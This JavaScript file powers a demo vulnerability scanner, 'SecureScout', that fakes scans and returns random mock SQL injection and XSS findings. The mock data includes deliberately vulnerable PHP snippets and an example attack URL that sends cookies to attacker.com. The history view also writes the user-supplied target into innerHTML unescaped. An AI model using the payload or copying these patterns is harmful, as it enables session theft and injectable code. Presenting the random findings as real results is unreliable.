/**
 * Scanner functionality for SecureScout
 */

const scanner = {
  isScanning: false,
  scanStartTime: null,
  scanTimer: null,
  scanProgress: 0,
  scanTarget: null,
  mockVulnerabilities: null,
  
  /**
   * Initialize scanner
   */
  init: () => {
    // Set up event listeners
    document.getElementById('scanForm')?.addEventListener('submit', scanner.startScan);
    document.getElementById('cancelScanBtn')?.addEventListener('click', scanner.cancelScan);
    
    // Initialize mock vulnerabilities for demo
    scanner.initMockData();
    
    // Load and display scan history
    scanner.displayScanHistory();
  },
  
  /**
   * Display scan history
   */
  displayScanHistory: () => {
    const history = utils.getScanHistory();
    const container = document.getElementById('scanHistoryList');
    if (!container) return;
    
    container.innerHTML = '';
    
    if (history.length === 0) {
      container.innerHTML = `
        <div class="empty-history">
          <p>No scan history available</p>
        </div>
      `;
      return;
    }
    
    history.forEach(scan => {
      const item = document.createElement('div');
      item.className = 'history-item';
      
      const vulnerabilitiesCount = scan.results?.vulnerabilities?.length || 0;
      const severityClass = vulnerabilitiesCount > 0 ? 
        utils.getSeverityClass(scan.results.vulnerabilities[0].severity) :
        'severity-success';
      
      item.innerHTML = `
        <div class="history-item-header">
          <div class="history-item-title">
            <span class="history-severity ${severityClass}"></span>
            <h4>${scan.target}</h4>
          </div>
          <span class="history-date">${utils.formatDate(scan.date)}</span>
        </div>
        <div class="history-item-details">
          <div class="history-stat">
            <span class="stat-label">Vulnerabilities:</span>
            <span class="stat-value">${vulnerabilitiesCount}</span>
          </div>
          <div class="history-stat">
            <span class="stat-label">Duration:</span>
            <span class="stat-value">${scan.scanDuration}s</span>
          </div>
          <button class="btn btn-outline btn-sm view-report-btn" data-scan-id="${scan.id}">
            View Report
          </button>
        </div>
      `;
      
      // Add click handler for view report button
      item.querySelector('.view-report-btn').addEventListener('click', () => {
        scanner.displayHistoricalReport(scan);
      });
      
      container.appendChild(item);
    });
  },
  
  /**
   * Display historical report
   * @param {Object} scan - Historical scan data
   */
  displayHistoricalReport: (scan) => {
    // Show results section
    const resultsSection = document.getElementById('resultsSection');
    const scannerSection = document.querySelector('.scanner-section');
    const historySection = document.getElementById('historySection');
    
    if (resultsSection && scannerSection && historySection) {
      scannerSection.classList.add('hidden');
      historySection.classList.add('hidden');
      resultsSection.classList.remove('hidden');
      
      // Display results using the existing results manager
      resultsManager.displayResults(scan.results);
      
      // Update scan info
      document.getElementById('scanTargetUrl').textContent = scan.target;
      document.getElementById('elapsedTime').textContent = utils.formatTime(scan.scanDuration);
    }
  },
  
  /**
   * Start a security scan
   * @param {Event} e - Form submit event
   */
  startScan: (e) => {
    e.preventDefault();
    
    // Get form values
    const targetUrl = document.getElementById('targetUrl').value;
    const sqlInjectionEnabled = document.getElementById('sqlInjection').checked;
    const xssEnabled = document.getElementById('xss').checked;
    const scanDepth = document.querySelector('input[name="scanDepth"]:checked').value;
    
    // Validate URL
    if (!utils.isValidUrl(targetUrl)) {
      utils.showToast('Please enter a valid URL', 'error');
      return;
    }
    
    // Check that at least one scan type is selected
    if (!sqlInjectionEnabled && !xssEnabled) {
      utils.showToast('Please select at least one vulnerability type to scan', 'warning');
      return;
    }
    
    // Set scan target and display it
    scanner.scanTarget = targetUrl;
    document.getElementById('scanTargetUrl').textContent = targetUrl;
    
    // Show scanning status
    animations.transitionSections('.scan-form-container', '#scanStatus');
    
    // Set scanning flag and start time
    scanner.isScanning = true;
    scanner.scanStartTime = Date.now();
    scanner.scanProgress = 0;
    
    // Dispatch scan start event
    document.dispatchEvent(new CustomEvent('scanStart'));
    
    // Update scan status
    document.getElementById('scanCurrentStatus').textContent = 'Initializing scan...';
    
    // Start elapsed time counter
    scanner.startElapsedTimeCounter();
    
    // Start scan simulation (in a real app, this would make an API call)
    scanner.simulateScan(scanDepth, sqlInjectionEnabled, xssEnabled);
  },
  
  /**
   * Cancel an ongoing scan
   */
  cancelScan: () => {
    if (!scanner.isScanning) return;
    
    // Ask for confirmation
    if (confirm('Are you sure you want to cancel the current scan?')) {
      scanner.stopScan();
      animations.transitionSections('#scanStatus', '.scan-form-container');
      utils.showToast('Scan cancelled', 'info');
    }
  },
  
  /**
   * Stop scan and clean up
   */
  stopScan: () => {
    scanner.isScanning = false;
    
    // Clear timers
    clearInterval(scanner.scanTimer);
    
    // Dispatch scan complete event
    document.dispatchEvent(new CustomEvent('scanComplete'));
  },
  
  /**
   * Start elapsed time counter
   */
  startElapsedTimeCounter: () => {
    const elapsedTimeElement = document.getElementById('elapsedTime');
    
    scanner.scanTimer = setInterval(() => {
      if (!scanner.isScanning) {
        clearInterval(scanner.scanTimer);
        return;
      }
      
      const elapsedSeconds = Math.floor((Date.now() - scanner.scanStartTime) / 1000);
      elapsedTimeElement.textContent = utils.formatTime(elapsedSeconds);
    }, 1000);
  },
  
  /**
   * Simulate a security scan (for demo purposes)
   * @param {string} scanDepth - Scan depth (quick/deep)
   * @param {boolean} sqlInjectionEnabled - Whether to scan for SQL injection
   * @param {boolean} xssEnabled - Whether to scan for XSS
   */
  simulateScan: (scanDepth, sqlInjectionEnabled, xssEnabled) => {
    const scanSteps = [
      { progress: 5, status: 'Connecting to target...' },
      { progress: 10, status: 'Analyzing website structure...' },
      { progress: 15, status: 'Identifying entry points...' },
      { progress: 30, status: 'Scanning forms and input fields...' },
      { progress: 50, status: 'Testing for vulnerabilities...' },
      { progress: 70, status: 'Analyzing responses...' },
      { progress: 85, status: 'Generating report...' },
      { progress: 95, status: 'Finalizing results...' },
      { progress: 100, status: 'Scan complete!' }
    ];
    
    // Determine total scan time based on depth
    const totalScanTime = scanDepth === 'quick' ? 5000 : 10000;
    const stepInterval = totalScanTime / scanSteps.length;
    
    let currentStep = 0;
    
    // Update progress immediately with first step
    scanner.updateScanProgress(scanSteps[0].progress, scanSteps[0].status);
    
    const progressInterval = setInterval(() => {
      if (!scanner.isScanning) {
        clearInterval(progressInterval);
        return;
      }
      
      currentStep++;
      
      if (currentStep < scanSteps.length) {
        scanner.updateScanProgress(scanSteps[currentStep].progress, scanSteps[currentStep].status);
      } else {
        clearInterval(progressInterval);
        
        // Scan complete
        scanner.updateScanProgress(100, 'Scan complete!');
        scanner.stopScan();
        
        // Generate results based on enabled scan types
        setTimeout(() => {
          const results = scanner.generateMockResults(sqlInjectionEnabled, xssEnabled);
          
          // Save to history
          utils.saveScanHistory({
            target: scanner.scanTarget,
            scanDuration: Math.floor((Date.now() - scanner.scanStartTime) / 1000),
            results: results
          });
          
          // Update history display
          scanner.displayScanHistory();
          
          // Display results
          resultsManager.displayResults(results);
        }, 1000);
      }
    }, stepInterval);
  },
  
  /**
   * Update scan progress
   * @param {number} progress - Progress percentage (0-100)
   * @param {string} status - Status message
   */
  updateScanProgress: (progress, status) => {
    scanner.scanProgress = progress;
    
    // Update progress bar
    animations.updateProgressBar(progress);
    
    // Update status message
    const statusElement = document.getElementById('scanCurrentStatus');
    if (statusElement) {
      statusElement.textContent = status;
    }
  },
  
  /**
   * Initialize mock vulnerability data for demo
   */
  initMockData: () => {
    scanner.mockVulnerabilities = {
      sqlInjection: [
        {
          title: 'SQL Injection in Login Form',
          severity: 'Critical',
          location: '/login.php',
          description: 'The login form is vulnerable to SQL injection attacks. User input is not properly sanitized before being used in SQL queries.',
          impact: 'An attacker could bypass authentication, extract sensitive data, or execute arbitrary SQL commands on the database.',
          recommendation: 'Use prepared statements or parameterized queries instead of directly incorporating user input into SQL queries. Implement input validation and sanitization.',
          code: `$username = $_POST['username'];
$password = $_POST['password'];

// Vulnerable code
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($connection, $query);`
        },
        {
          title: 'SQL Injection in Search Function',
          severity: 'High',
          location: '/search.php',
          description: 'The search function is vulnerable to SQL injection. User input from the search field is inserted directly into SQL queries.',
          impact: 'Attackers could extract sensitive data, modify database contents, or potentially gain access to the underlying server.',
          recommendation: 'Use prepared statements with parameterized queries. Apply proper input validation and consider using an ORM (Object-Relational Mapping) library.',
          code: `$searchTerm = $_GET['q'];

// Vulnerable code
$query = "SELECT * FROM products WHERE name LIKE '%$searchTerm%' OR description LIKE '%$searchTerm%'";
$result = mysqli_query($connection, $query);`
        },
        {
          title: 'Blind SQL Injection Vulnerability',
          severity: 'Medium',
          location: '/profile.php',
          description: 'The profile page is vulnerable to blind SQL injection attacks through the user ID parameter.',
          impact: 'Even without direct error messages, attackers can extract data by observing differences in application responses.',
          recommendation: 'Use parameterized queries and implement proper input validation. Consider using a Web Application Firewall (WAF) as an additional security layer.',
          code: `$userId = $_GET['id'];

// Vulnerable code
$query = "SELECT * FROM user_profiles WHERE user_id = $userId";
$result = $db->query($query);`
        }
      ],
      xss: [
        {
          title: 'Stored XSS in Comment System',
          severity: 'Critical',
          location: '/comments.php',
          description: 'The comment system stores user input without proper sanitization, allowing attackers to inject malicious JavaScript.',
          impact: 'Attackers can steal session cookies, redirect users to malicious sites, or perform actions on behalf of other users.',
          recommendation: 'Sanitize user input before storing in the database. Use HTML encoding when displaying user-generated content. Consider using a Content Security Policy.',
          code: `// PHP code that stores comments
$comment = $_POST['comment'];

// Vulnerable code - directly storing user input
$query = "INSERT INTO comments (user_id, comment_text) VALUES ($userId, '$comment')";
mysqli_query($connection, $query);

// JavaScript that displays comments
document.getElementById('comments').innerHTML = data.commentHtml; // Insecure`
        },
        {
          title: 'Reflected XSS in Error Messages',
          severity: 'High',
          location: '/error.php',
          description: 'Error messages reflect user input without proper encoding, allowing for XSS attacks via specifically crafted URLs.',
          impact: 'Attackers can create malicious links that execute JavaScript in victims\' browsers when clicked.',
          recommendation: 'Encode all output that contains user input. Use a templating system that automatically escapes output.',
          code: `// Vulnerable code
if (!isset($_GET['id'])) {
  echo "<div class='error'>Missing parameter: " . $_GET['parameter'] . "</div>";
}

// Example attack URL:
// error.php?parameter=<script>document.location='https://attacker.com/steal.php?cookie='+document.cookie</script>`
        },
        {
          title: 'DOM-based XSS Vulnerability',
          severity: 'Medium',
          location: '/js/main.js',
          description: 'Client-side JavaScript code insecurely processes URL fragment identifiers, leading to DOM-based XSS.',
          impact: 'Attackers can execute arbitrary JavaScript by crafting specific URLs with malicious fragments.',
          recommendation: 'Use safe DOM manipulation methods and sanitize all data before inserting it into the DOM.',
          code: `// Vulnerable code
const value = window.location.hash.substring(1);
document.getElementById('output').innerHTML = decodeURIComponent(value);

// Safer alternative
document.getElementById('output').textContent = decodeURIComponent(value);`
        }
      ]
    };
  },
  
  /**
   * Generate mock scan results based on enabled scan types
   * @param {boolean} sqlInjectionEnabled - Whether SQL injection scan was enabled
   * @param {boolean} xssEnabled - Whether XSS scan was enabled
   * @returns {Object} Scan results
   */
  generateMockResults: (sqlInjectionEnabled, xssEnabled) => {
    let vulnerabilities = [];
    
    // Add some random factor to make each scan seem unique
    const randomFactor = Math.random();
    
    if (sqlInjectionEnabled) {
      // Include 1-3 SQL injection vulnerabilities based on random factor
      const sqlVulnCount = randomFactor < 0.3 ? 1 : (randomFactor < 0.7 ? 2 : 3);
      vulnerabilities = vulnerabilities.concat(
        scanner.mockVulnerabilities.sqlInjection.slice(0, sqlVulnCount)
      );
    }
    
    if (xssEnabled) {
      // Include 1-3 XSS vulnerabilities based on random factor
      const xssVulnCount = randomFactor < 0.4 ? 1 : (randomFactor < 0.8 ? 2 : 3);
      vulnerabilities = vulnerabilities.concat(
        scanner.mockVulnerabilities.xss.slice(0, xssVulnCount)
      );
    }
    
    // Randomly decide if we should report zero vulnerabilities
    if (randomFactor > 0.95) {
      vulnerabilities = [];
    }
    
    return {
      scanDate: new Date().toISOString(),
      target: scanner.scanTarget,
      vulnerabilities: vulnerabilities,
      scanDuration: Math.floor((Date.now() - scanner.scanStartTime) / 1000)
    };
  }
};

// Initialize scanner on DOMContentLoaded
document.addEventListener('DOMContentLoaded', scanner.init);